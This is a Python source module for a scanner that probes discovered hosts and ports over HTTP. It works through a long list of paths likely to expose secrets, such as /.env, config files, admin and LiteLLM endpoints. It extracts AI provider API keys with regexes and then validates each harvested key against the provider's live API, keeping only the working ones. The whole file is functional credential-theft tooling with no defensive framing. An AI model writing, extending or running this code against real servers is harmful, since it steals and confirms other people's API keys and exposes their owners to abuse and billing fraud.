"""
HTTP probe — fires HTTP requests at discovered ports to find API key panels.
Regex-based extraction for OpenAI, Gemini, OpenRouter, DeepSeek, etc.
"""
import re
import json
import logging
import asyncio
from typing import Optional
import aiohttp

logger = logging.getLogger(__name__)

# High-value endpoints that often leak API keys
TARGET_ENDPOINTS = [
    "/api/settings",
    "/api/config",
    "/config.js",
    "/config.json",
    "/.env",
    "/env",
    "/server.js",
    "/app.js",
    "/index.js",
    "/main.js",
    "/settings",
    "/admin",
    "/admin/settings",
    "/admin/config",
    "/api/admin/settings",
    "/api/keys",
    "/api/key",
    "/keys",
    "/api/v1/keys",
    "/api/v1/settings",
    "/api/v1/config",
    "/api/v2/settings",
    "/api/v2/config",
    "/config",
    "/dashboard",
    "/api/dashboard",
    "/api/health",
    "/api/status",
    "/v1/settings",
    "/v2/settings",
    "/.config.json",
    "/config.yaml",
    "/config.yml",
    "/config.toml",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/env.js",
    "/env.json",
    "/api/env",
    "/api/.env",
    "/debug",
    "/api/debug",
    "/api/info",
    "/info",
    "/status",
    "/api/status/config",
    "/api/admin",
    "/panel",
    "/api/panel",
    "/litellm/config",
    "/litellm/api/config",
    "/proxy/config",
    "/api/proxy/config",
    "/openai",
    "/api/openai",
    "/api/chat/config",
    "/api/providers",
    "/providers",
]

# Regex patterns for various API key providers
KEY_PATTERNS = {
    "OpenAI": re.compile(
        r'sk-(?:proj-|live-|test-)?[A-Za-z0-9]{20,}(?:T3BlbkFJ[A-Za-z0-9]{20,})?',
        re.IGNORECASE
    ),
    "Gemini": re.compile(
        r'AIza[0-9A-Za-z_-]{35}',
        re.IGNORECASE
    ),
    "OpenRouter": re.compile(
        r'sk-or-v1-[A-Za-z0-9]{40,}',
        re.IGNORECASE
    ),
    "DeepSeek": re.compile(
        r'sk-[a-f0-9]{32,}',
        re.IGNORECASE
    ),
    "Anthropic": re.compile(
        r'sk-ant-api03-[A-Za-z0-9_-]{40,}',
        re.IGNORECASE
    ),
    "Cohere": re.compile(
        r'[A-Za-z0-9]{40}',
        re.IGNORECASE
    ),
    "HuggingFace": re.compile(
        r'hf_[A-Za-z0-9]{34,}',
        re.IGNORECASE
    ),
    "Azure": re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        re.IGNORECASE
    ),
    "TogetherAI": re.compile(
        r'together-[A-Za-z0-9]{20,}',
        re.IGNORECASE
    ),
    "Groq": re.compile(
        r'gsk_[A-Za-z0-9]{20,}',
        re.IGNORECASE
    ),
    "Replicate": re.compile(
        r'r8_[A-Za-z0-9]{20,}',
        re.IGNORECASE
    ),
    "Perplexity": re.compile(
        r'pplx-[A-Za-z0-9]{20,}',
        re.IGNORECASE
    ),
    "Mistral": re.compile(
        r'[A-Za-z0-9]{32}',
        re.IGNORECASE
    ),
}

# Provider-specific model endpoints for validation
VALIDATION_ENDPOINTS = {
    "OpenAI": {
        "url": "https://api.openai.com/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Gemini": {
        "url": "https://generativelanguage.googleapis.com/v1beta/models?key={key}",
        "headers": lambda key: {},
        "success_check": lambda resp: resp.status == 200,
    },
    "OpenRouter": {
        "url": "https://openrouter.ai/api/v1/auth/key",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "DeepSeek": {
        "url": "https://api.deepseek.com/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Anthropic": {
        "url": "https://api.anthropic.com/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}", "anthropic-version": "2023-06-01"},
        "success_check": lambda resp: resp.status == 200,
    },
    "HuggingFace": {
        "url": "https://huggingface.co/api/models?limit=1",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "TogetherAI": {
        "url": "https://api.together.xyz/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Groq": {
        "url": "https://api.groq.com/openai/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Replicate": {
        "url": "https://api.replicate.com/v1/models",
        "headers": lambda key: {"Authorization": f"Key {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Perplexity": {
        "url": "https://api.perplexity.ai/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
    "Mistral": {
        "url": "https://api.mistral.ai/v1/models",
        "headers": lambda key: {"Authorization": f"Bearer {key}"},
        "success_check": lambda resp: resp.status == 200,
    },
}


class FoundKey:
    """Represents a discovered API key with its metadata."""

    def __init__(self, provider: str, key: str, source_ip: str, source_port: int, endpoint: str):
        self.provider = provider
        self.key = key
        self.source_ip = source_ip
        self.source_port = source_port
        self.endpoint = endpoint
        self.validated = None

    def to_dict(self) -> dict:
        return {
            "provider": self.provider,
            "key": self.key,
            "ip": self.source_ip,
            "port": self.source_port,
            "endpoint": self.endpoint,
            "validated": self.validated,
        }

    def __repr__(self):
        return f"<FoundKey {self.provider}:{self.key[:20]}... @ {self.source_ip}:{self.source_port}{self.endpoint}>"


class HTTPProbe:
    """HTTP prober — checks endpoints and extracts API keys."""

    def __init__(self, timeout: float = 5.0, max_concurrent: int = 100):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.connector = aiohttp.TCPConnector(limit=0, force_close=True)

    async def probe_ip_port(self, ip: str, port: int) -> list[FoundKey]:
        """
        Probe a single IP:port pair against all endpoints.
        Returns list of FoundKey objects.
        """
        found_keys = []
        async with self.semaphore:
            for endpoint in TARGET_ENDPOINTS:
                url = f"http://{ip}:{port}{endpoint}"
                try:
                    async with aiohttp.ClientSession(connector=self.connector) as session:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout),
                                                ssl=False) as resp:
                            if resp.status in (200, 401, 403, 500, 502, 503):
                                text = await resp.text()
                                keys = self._extract_keys(text, ip, port, endpoint)
                                found_keys.extend(keys)
                except (asyncio.TimeoutError, aiohttp.ClientError, Exception):
                    continue
        return found_keys

    def _extract_keys(self, text: str, ip: str, port: int, endpoint: str) -> list[FoundKey]:
        """Extract all API keys from response text."""
        found = []
        for provider, pattern in KEY_PATTERNS.items():
            matches = pattern.findall(text)
            for match in matches:
                # Deduplicate by key value
                key_obj = FoundKey(provider, match, ip, port, endpoint)
                found.append(key_obj)
        return found


class KeyValidator:
    """Validates discovered API keys against their provider APIs."""

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.connector = aiohttp.TCPConnector(limit=50)

    async def validate(self, found_key: FoundKey) -> Optional[FoundKey]:
        """
        Validate a key against its provider's API.
        Returns the FoundKey with validated=True/False or None if no validator.
        """
        provider = found_key.provider
        if provider not in VALIDATION_ENDPOINTS:
            found_key.validated = None  # Can't validate
            return None

        config = VALIDATION_ENDPOINTS[provider]
        url = config["url"].format(key=found_key.key) if "{key}" in config["url"] else config["url"]
        headers = config["headers"](found_key.key)

        try:
            async with aiohttp.ClientSession(connector=self.connector) as session:
                async with session.get(url, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=self.timeout),
                                       ssl=True) as resp:
                    is_valid = config["success_check"](resp)
                    found_key.validated = is_valid
                    if is_valid:
                        return found_key
                    return None
        except Exception:
            found_key.validated = False
            return None

    async def validate_batch(self, keys: list[FoundKey]) -> list[FoundKey]:
        """Validate multiple keys in parallel. Returns only valid ones."""
        tasks = [self.validate(k) for k in keys]
        results = await asyncio.gather(*tasks)
        return [r for r in results if r is not None and r.validated]
